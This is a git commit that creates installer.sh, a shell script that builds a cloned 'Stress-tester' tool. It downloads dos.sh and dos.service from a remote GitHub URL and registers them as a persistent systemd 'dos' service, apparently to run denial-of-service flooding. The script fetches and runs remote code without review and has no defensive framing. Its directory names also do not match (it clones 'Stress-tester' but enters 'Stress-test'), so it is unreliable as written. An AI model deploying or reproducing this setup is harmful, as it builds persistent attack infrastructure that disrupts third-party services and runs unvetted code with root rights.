6c2c0f65f8ec2f90668c6973c6b6379406ef68cf
Tokaaaaage <104607502+Tokaaaaage@users.noreply.github.com>
2022-05-05 22:04:53 +0900

    Create installer.sh

---
+++ installer.sh
@@ -0,0 +1,15 @@
+apt update
+apt upgrade -y
+apt install git -y
+apt install golang -y
+ulimit -n 999999
+git clone https://github.com/Leeon123/Stress-tester.git
+cd Stress-test
+go build stress.go
+wget https://raw.githubusercontent.com/Tokaaaage/a/main/dos.sh
+chmod 777 dos.sh
+cd /etc/systemd/system
+wget https://raw.githubusercontent.com/Tokaaaage/a/main/dos.service
+systemctl daemon-reload
+systemctl restart dos
+systemctl enable dos
